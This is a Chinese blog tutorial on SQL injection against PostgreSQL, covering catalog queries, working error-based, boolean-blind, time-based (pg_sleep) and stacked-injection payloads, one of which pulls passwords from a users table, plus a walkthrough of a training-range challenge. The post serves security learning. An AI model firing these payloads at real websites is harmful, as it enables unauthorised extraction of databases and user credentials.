<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>SQL注入漏洞（postgresql注入） - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="SQL注入漏洞（postgresql注入）" />
<meta property="og:description" content="以前孤陋寡闻对postgresql这个数据库少有了解，后来与几个目前在企业实习的朋友聊天才得知他们有的公司项目用的是postgresql，有的公司是正在将原本的数据库迁移到postgresql。可见postgresql比较热（毕竟免费且功能齐全）。
postgresql简称PG，是一种特性非常齐全的自由软件的对象-关系型数据库管理系统。
默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。
简单使用 连接数据库
psql -U 用户名 -h 主机号 [-d 数据库名,-p 端口号] 查库：\l
选库：\c 库名
查表：\d
查列：\d 表名
\x：查询结果以行或列显示切换
如果连接不上数据库就在，/etc/postgresql/版本数/main/pg_hba.conf中添加IP如下图中最下面的一行格式即可。
postgresql与MySQL的特性也有相通，比如information_schema也是存在的且与MySQL的使用大致相同，不过postgresql查表的限制都是public，啥意思？操作一下就知道了
MySQL查表时，table_schema限制为数据库名，postgresql为public。
postgresql有几个特有的查询关键字
current_catalog / current_database() 与MySQL中的database()作用相同，为当前数据库名
pg_database可查询所有的数据库（列名关键字为datname）
MySQL中的limit 0,1在postgresql只能以limit 1 offset 0格式存在
user / current_user / getpgusername()都可用于查询当前用户名
pg_stat_user_tables为当用户的表单所有信息，可用于查表名（列关键字为relname）
current_schema[()]表示当前模式名
pg_tables 是一个系统表，提供对数据库中每个表的信息的访问，通过对schemaname模式的限制得到表名
另外，postgresql只有--&#43;注释符，像#、;%00都是不可以的。
SQL注入 联合注入就不说了，记住上面几个关键字，MySQL能union注入查询的，postgresql也是一样查询。
报错注入 postgresql的报错注入原理与MSSQL的相同利用强类型语言数据库特性，当类型不一致时将会报错带出敏感数据达到注入的目的。具体用到的函数与MSSQL相同，cast()或者convert()这种强制转换的函数在与一个数比较达到报错目的。（前提是目标网站开启了报错提示）。
查看版本： 1 AND 2=CAST((SELECT version())::text AS NUMERIC) 查库： 1 AND 2=CAST((SELECT current_database())::text AS NUMERIC) 1 AND 2=CAST((SELECT datname from pg_database limit 1 offset 0)::text AS NUMERIC) ……………… 查表： 1 AND 2=CAST((SELECT relname from pg_stat_user_tables limit 1 offset 0)::text AS NUMERIC) ……………… 查列： 1 AND 2=CAST((select column_name from information_schema." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/7745c30b7f34ed8e867148c5c6b6e043/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-08T13:59:20+08:00" />
<meta property="article:modified_time" content="2022-07-08T13:59:20+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SQL注入漏洞（postgresql注入）</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>以前孤陋寡闻对<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>这个数据库少有了解，后来与几个目前在企业实习的朋友聊天才得知他们有的公司项目用的是<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>，有的公司是正在将原本的数据库迁移到<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>。可见<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>比较热（毕竟免费且功能齐全）。</p> 
<p><span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>简称<strong>PG</strong>，是一种特性非常齐全的自由软件的对象-关系型数据库管理系统。</p> 
<blockquote> 
 <p>默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。</p> 
</blockquote> 
<h2>简单使用</h2> 
<p>连接数据库</p> 
<pre><code>psql -U 用户名 -h 主机号 [-d 数据库名,-p 端口号]</code></pre> 
<blockquote> 
 <p>查库：\l</p> 
 <p>选库：\c  库名</p> 
 <p>查表：\d</p> 
 <p>查列：\d 表名</p> 
 <p>\x：查询结果以行或列显示切换</p> 
</blockquote> 
<p>如果连接不上数据库就在，<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">/etc/postgresql/版本数/main/pg_hba.conf</span></strong></span>中添加IP如下图中最下面的一行格式即可。</p> 
<p><img alt="" height="84" src="https://images2.imgbox.com/81/be/Qcszqpyk_o.png" width="517"></p> 
<p><span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>与<strong>MySQL</strong>的特性也有相通，比如<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">information_schema</span></strong></span>也是存在的且与<strong>MySQL</strong>的使用大致相同，不过<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>查表的限制都是<strong>public</strong>，啥意思？操作一下就知道了</p> 
<p><img alt="" height="253" src="https://images2.imgbox.com/b7/15/GEWUW37b_o.png" width="1200"></p> 
<p><strong>MySQL</strong>查表时，<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">table_schema</span></strong></span>限制为数据库名，<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>为public。</p> 
<p><span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>有几个特有的查询关键字</p> 
<blockquote> 
 <p>current_catalog / current_database() 与MySQL中的database()作用相同，为当前数据库名</p> 
 <p></p> 
 <p>pg_database可查询所有的数据库（列名关键字为datname）</p> 
 <p></p> 
 <p>MySQL中的limit 0,1在postgresql只能以limit 1 offset 0格式存在</p> 
 <p></p> 
 <p>user / current_user / getpgusername()都可用于查询当前用户名</p> 
 <p></p> 
 <p>pg_stat_user_tables为当用户的表单所有信息，可用于查表名（列关键字为relname）</p> 
 <p></p> 
 <p>current_schema[()]表示当前模式名</p> 
 <p></p> 
 <p>pg_tables 是一个系统表，提供对数据库中每个表的信息的访问，通过对schemaname模式的限制得到表名</p> 
</blockquote> 
<p>另外，<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>只有<strong>--+</strong>注释符，像<strong>#</strong>、<strong>;%00</strong>都是不可以的。</p> 
<h2>SQL注入</h2> 
<p>联合注入就不说了，记住上面几个关键字，<strong>MySQL</strong>能<strong>union</strong>注入查询的，<strong>postgresql</strong>也是一样查询。</p> 
<h3>报错注入</h3> 
<p><span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>的报错注入原理与<strong>MSSQL</strong>的相同利用强类型语言数据库特性，当类型不一致时将会报错带出敏感数据达到注入的目的。具体用到的函数与<strong>MSSQL</strong>相同，<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">cast()</span></strong></span>或者<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">convert()</span></strong></span>这种强制转换的函数在与一个数比较达到报错目的。（前提是目标网站开启了报错提示）。</p> 
<pre><code class="language-sql">查看版本：
1 AND 2=CAST((SELECT version())::text AS NUMERIC)

查库：
1 AND 2=CAST((SELECT current_database())::text AS NUMERIC)
1 AND 2=CAST((SELECT datname from pg_database limit 1 offset 0)::text AS NUMERIC)
………………

查表：
1 AND 2=CAST((SELECT relname from pg_stat_user_tables limit 1 offset 0)::text AS NUMERIC)
………………

查列：
1 AND 2=CAST((select column_name from information_schema.columns where table_name='test' limit 1 offset 0)::text AS NUMERIC)


还有一个sqlmap跑出来的payload（仅供参考）：
1 AND 7778=CAST((CHR(113)||CHR(98)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (7778=7778) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(118)||CHR(112)||CHR(106)||CHR(113)) AS NUMERIC)</code></pre> 
<blockquote> 
 <p>这里解释一下这几个函数在这里面的作用：</p> 
 <p><strong>CAST()</strong>：强制转换，在这里主要格式为CAST('string' as NUMERIC)，即将字符串转换为数字型。</p> 
 <p></p> 
 <p><strong>1::text </strong> :   这个和上面恰好相反，它的意思是将一个数字型转换为text文本类型</p> 
 <p></p> 
 <p>sqlmap中有个<strong>case...when...then...else...end</strong>  是类似与if的分支条件语句</p> 
</blockquote> 
<h3>布尔盲注</h3> 
<p>利用<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">ascii()</span></strong></span>、<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">substring()</span></strong></span>、<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">between</span></strong></span>（或者用等于号 = 判断）</p> 
<pre><code class="language-sql">判断数据库名长度：
1' and (select length(current_database())) between 0 and 14 --+

判断数据表的个数：
1' and (select count(*) from pg_stat_user_tables) between 0 and 4 --+

判断数据库的名：
1' and (select ascii(substr(current_database(),1,1))) between 0 and 118--+

判断表名长度：
1' and (select length(relname) from pg_stat_user_tables limit 1 OFFSET 0) between 0 and 5--+

判断表名：
1' and  (select ascii(substr(relname,1,1)) from pg_stat_user_tables limit 1 OFFSET 0) between 0 and 117--+

判断列名：
1' and  (select ascii(substr(column_name,1,1)) from information_schema.columns where table_name='users' limit 1 OFFSET 0) between 0 and 110 --+

……………………</code></pre> 
<p>原理啥的应该不用说了，如果不知道建议看前面的<strong>MySQL</strong>文章循序渐进。</p> 
<h3>时间盲注</h3> 
<p>找一个替代<strong>MySQL</strong>中<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">sleep()</span></strong></span>或者<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">benchmark()</span></strong></span>作用的函数-----<span style="color:#fe2c24;"><strong><span style="background-color:#fef2f0;">pg_sleep()</span></strong></span>。</p> 
<pre><code class="language-sql">查库：
1 and (case when(ascii(substr((select datname from pg_database limit 1),1,1))=97) then (select 5 from pg_sleep(5)) else 1 end)

查表：
1 and (case when(ascii(substr((select relname from pg_stat_user_tables limit 1 offset 0),1,1))=97) then (select 5 from pg_sleep(5)) else 1 end)

查列：
1 and (case when(ascii(substr((select column_name from information_schema.columns where table_name="users" limit 1 offset 0),1,1))=97) then (select 5 from pg_sleep(5)) else 1 end)

查字段：
1 and (case when(ascii(substr((select password from users limit 1 offset 0),1,1))=97) then (select 5 from pg_sleep(5)) else 1 end)</code></pre> 
<h3>堆叠注入</h3> 
<p>只要一句sql语句有个结束标志，且网站对<strong>sql语句</strong>的执行条数没有限制，<strong>堆叠注入</strong>是最简单方便的。</p> 
<p><img alt="" height="529" src="https://images2.imgbox.com/ab/51/8NNESrpF_o.png" width="637"></p> 
<h2>小试牛刀</h2> 
<h3>SQL手工注入漏洞测试(PostgreSQL数据库）</h3> 
<p>墨者学院靶场的一个<span style="color:#fe2c24;"><strong><span style="background-color:#f3f3f4;">postgresql</span></strong></span>题目，一起巩固一下吧。</p> 
<p><img alt="" height="460" src="https://images2.imgbox.com/ed/e6/vwBrqBOM_o.png" width="1088"></p> 
<p>初步判断为数字型注入，进而运用 order by 判断列的数量为4，但是出现如下</p> 
<p><img alt="" height="468" src="https://images2.imgbox.com/2a/44/u1M0d28z_o.png" width="1053"></p> 
<p> 无反应？不用慌，出现这种情况说明联合注入时类型不统一，所以我们一个一个的测试</p> 
<p><img alt="" height="505" src="https://images2.imgbox.com/12/a1/O2xxeN9V_o.png" width="1073"></p> 
<p>经过测试发现四个类型都为字符型，因此就成功了，我们就可以用比较常规的查询做了，查库，</p> 
<p><img alt="" height="458" src="https://images2.imgbox.com/e6/9e/OOStxRmU_o.png" width="1098"></p> 
<p> 查表，</p> 
<p><img alt="" height="496" src="https://images2.imgbox.com/19/49/Hl6udwXo_o.png" width="1146"></p> 
<p>依次遍历表查到一个类似用户表的名字，进而查列</p> 
<p><img alt="" height="476" src="https://images2.imgbox.com/8f/dc/zUg1lpWu_o.png" width="1138"></p> 
<p>最后把数据查出来即可</p> 
<p><img alt="" height="508" src="https://images2.imgbox.com/ea/5a/arYSlrb8_o.png" width="1086"></p> 
<p></p> 
<p>参考：<a href="https://blog.csdn.net/weixin_49756466/article/details/121689023" title="PostgreSQL 12系统表(2)pg_tables_MambaCloud的博客-CSDN博客">PostgreSQL 12系统表(2)pg_tables_MambaCloud的博客-CSDN博客</a></p> 
<p><a href="https://blog.csdn.net/qq_36119192/article/details/104628797" title="PostgreSQL数据库的注入_谢公子的博客-CSDN博客_postgresql注入">PostgreSQL数据库的注入_谢公子的博客-CSDN博客_postgresql注入</a></p> 
<p><a href="https://www.freesion.com/article/1582296820/" rel="nofollow" title="postgresql使用（三）：收集Postgresql数据库统计信息 - 灰信网（软件开发博客聚合）">postgresql使用（三）：收集Postgresql数据库统计信息 - 灰信网（软件开发博客聚合）</a><br><a href="https://www.jianshu.com/p/ba0297da2c2e" rel="nofollow" title="Postgresql注入笔记 - 简书">Postgresql注入笔记 - 简书</a></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/78b48e73ef6837238e9d6da7fd2a361a/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">svg大小根据内容自适应</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/9d0d135d471d69885aa092ae379d0add/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">关于js内部处理方法的那点事</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>